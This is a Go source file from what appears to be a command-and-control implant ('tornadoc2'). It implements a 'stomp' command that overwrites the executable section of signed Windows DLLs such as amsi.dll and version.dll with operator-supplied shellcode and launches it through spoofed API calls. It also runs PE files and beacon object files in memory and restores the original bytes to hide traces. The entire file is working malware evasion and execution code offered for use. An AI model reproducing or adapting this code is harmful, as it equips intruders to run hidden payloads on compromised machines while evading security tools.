//go:build ev_stomp && windows && amd64

package core

import (
	"context"
	"encoding/base64"
	"errors"
	"fmt"
	"os"
	"sync"
	"syscall"
	"unsafe"

	"tornadoc2/agent/internal/peimg"
	"tornadoc2/agent/internal/spoof"
	"tornadoc2/agent/native"
	"tornadoc2/agent/protocol"
)

type stompSaved struct {
	base uintptr
	raw  []byte
}

var (
	stompMu    sync.Mutex
	stompState = map[string]stompSaved{}
)

var (
	stompKernel32 = syscall.NewLazyDLL("kernel32.dll")
	stompLoad     = stompKernel32.NewProc("LoadLibraryExW")
	stompProtect  = stompKernel32.NewProc("VirtualProtect")
	stompFlush    = stompKernel32.NewProc("FlushInstructionCache")
	stompCreate   = stompKernel32.NewProc("CreateThread")
	stompWait     = stompKernel32.NewProc("WaitForSingleObject")
	stompClose    = stompKernel32.NewProc("CloseHandle")
	stompProc     = stompKernel32.NewProc("GetCurrentProcess")
)

const (
	stompRW     = 0x04
	stompRX     = 0x20
	stompExeBit = 0x20000000
)

// stompDLLs are signed Microsoft images present on a default
// install with a large executable section.
var stompDLLs = []string{
	"xpssupport.dll",
	"wldp.dll",
	"dxgi.dll",
	"amsi.dll",
	"version.dll",
}

func (a *Agent) stompVerb(ctx context.Context, t protocol.Task) protocol.Result {
	if len(t.Args) < 1 {
		return protocol.Result{ID: t.ID,
			Error: "stomp <shellcode_b64> [--dll name] [--force] | " +
				"stomp --restore [--dll name] | " +
				"stomp --pe|--bof <path>"}
	}
	if t.Args[0] == "--pe" || t.Args[0] == "--bof" {
		if len(t.Args) < 2 {
			return protocol.Result{ID: t.ID,
				Error: "stomp --pe|--bof <remote_path> [args...]"}
		}
		if t.Args[0] == "--pe" {
			out, code, err := native.ExecPEInMemory(ctx,
				t.Args[1], t.Args[2:])
			if err != nil {
				return protocol.Result{ID: t.ID, Error: err.Error()}
			}
			return protocol.Result{ID: t.ID,
				Output: encodeOutput([]byte(out)), ExitCode: code}
		}
		raw, err := os.ReadFile(t.Args[1])
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		out, code, err := native.ExecBOF(ctx, raw, "", nil)
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID,
			Output: encodeOutput([]byte(out)), ExitCode: code}
	}
	if t.Args[0] == "--restore" || t.Args[0] == "restore" {
		name := ""
		for i := 1; i < len(t.Args); i++ {
			if t.Args[i] == "--dll" && i+1 < len(t.Args) {
				name = t.Args[i+1]
			}
		}
		return stompRestore(t.ID, name)
	}
	raw, err := base64.StdEncoding.DecodeString(t.Args[0])
	if err != nil || len(raw) == 0 {
		return protocol.Result{ID: t.ID, Error: "invalid shellcode"}
	}
	if len(raw) > 8<<20 {
		return protocol.Result{ID: t.ID, Error: "shellcode exceeds 8 MiB"}
	}
	names := stompDLLs
	force := false
	for i := 1; i < len(t.Args); i++ {
		if t.Args[i] == "--dll" && i+1 < len(t.Args) {
			names = []string{t.Args[i+1]}
		}
		if t.Args[i] == "--force" {
			force = true
		}
	}

	var tried []string
	for _, name := range names {
		pid, addr, err := stompInto(name, raw, force)
		if err != nil {
			tried = append(tried, fmt.Sprintf("%s: %v", name, err))
			continue
		}
		_, _, _ = stompWait.Call(pid, 2000)
		_, _, _ = stompClose.Call(pid)
		return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(
			fmt.Sprintf("stomped %d bytes into %s at 0x%x\n",
				len(raw), name, addr)))}
	}
	return protocol.Result{ID: t.ID,
		Error: "no module accepted the payload: " +
			joinLines(tried)}
}

func joinLines(lines []string) string {
	out := ""
	for i, l := range lines {
		if i > 0 {
			out += "; "
		}
		out += l
	}
	return out
}

func stompRestore(id, dll string) protocol.Result {
	stompMu.Lock()
	defer stompMu.Unlock()
	names := []string{dll}
	if dll == "" {
		names = names[:0]
		for name := range stompState {
			names = append(names, name)
		}
	}
	if len(names) == 0 {
		return protocol.Result{ID: id, Output: encodeOutput(
			[]byte("nothing to restore\n"))}
	}
	var out string
	for _, name := range names {
		saved, ok := stompState[name]
		if !ok {
			continue
		}
		if err := stompWrite(saved.base, uintptr(len(saved.raw)),
			saved.raw); err != nil {
			return protocol.Result{ID: id,
				Error: name + ": " + err.Error()}
		}
		delete(stompState, name)
		out += "restored " + name + "\n"
	}
	return protocol.Result{ID: id, Output: encodeOutput([]byte(out))}
}

// stompWrite flips a range RW, copies bytes and returns it to RX.
func stompWrite(addr, size uintptr, data []byte) error {
	var old uint32
	r := spoof.Call4(stompProtect.Addr(), addr, size, stompRW,
		uintptr(unsafe.Pointer(&old)))
	if r == 0 {
		return fmt.Errorf("VirtualProtect failed")
	}
	copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), size), data)
	var tmp uint32
	spoof.Call4(stompProtect.Addr(), addr, size, stompRX,
		uintptr(unsafe.Pointer(&tmp)))
	proc, _, _ := stompProc.Call()
	_, _, _ = stompFlush.Call(proc, addr, size)
	return nil
}

func stompInto(dll string, raw []byte, force bool) (uintptr, uintptr, error) {
	sys32 := make([]uint16, 260)
	n, _, _ := stompGetSysDir.Call(uintptr(unsafe.Pointer(&sys32[0])),
		uintptr(len(sys32)))
	if n == 0 {
		return 0, 0, errors.New("GetSystemDirectory failed")
	}
	path := syscall.UTF16ToString(sys32[:n]) + `\` + dll
	p, _ := syscall.UTF16PtrFromString(path)
	h, _, e := stompLoad.Call(uintptr(unsafe.Pointer(p)), 0, 0)
	if h == 0 {
		return 0, 0, fmt.Errorf("LoadLibraryEx: %v", e)
	}
	base := uintptr(h)

	off, size, err := stompTarget(base, uintptr(len(raw)))
	if err != nil {
		return 0, 0, err
	}
	if size < uintptr(len(raw)) {
		return 0, 0, fmt.Errorf("section too small (%d < %d)", size,
			len(raw))
	}

	stompMu.Lock()
	if _, busy := stompState[dll]; busy && !force {
		stompMu.Unlock()
		return 0, 0, fmt.Errorf("%s already stomped "+
			"(restore or --force)", dll)
	}
	orig := make([]byte, len(raw))
	copy(orig, unsafe.Slice(
		(*byte)(unsafe.Pointer(base+off)), len(raw)))
	if err := stompWrite(base+off, uintptr(len(raw)), raw); err != nil {
		stompMu.Unlock()
		return 0, 0, err
	}
	stompState[dll] = stompSaved{base: base + off, raw: orig}
	stompMu.Unlock()

	var tid uint32
	th := spoof.Call11(stompCreate.Addr(), [11]uintptr{
		0, 0, base + off, 0, 0, uintptr(unsafe.Pointer(&tid))})
	if th == 0 {
		return 0, 0, errors.New("CreateThread failed")
	}
	return th, base + off, nil
}

var stompGetSysDir = stompKernel32.NewProc("GetSystemDirectoryW")

// stompTarget returns the offset and size of the largest executable
// section with room for `want` bytes.
func stompTarget(base, want uintptr) (uintptr, uintptr, error) {
	peek := unsafe.Slice((*byte)(unsafe.Pointer(base)), 0x1000)
	_, _, total, err := peimg.Layout(peek)
	if err != nil {
		return 0, 0, err
	}
	hdr := unsafe.Slice((*byte)(unsafe.Pointer(base)), total)
	off, size, err := peimg.ExecutableSection(hdr, uint32(want))
	if err != nil {
		return 0, 0, err
	}
	if err := peimg.CheckText(hdr, off); err != nil {
		return 0, 0, err
	}
	return uintptr(off), uintptr(size), nil
}
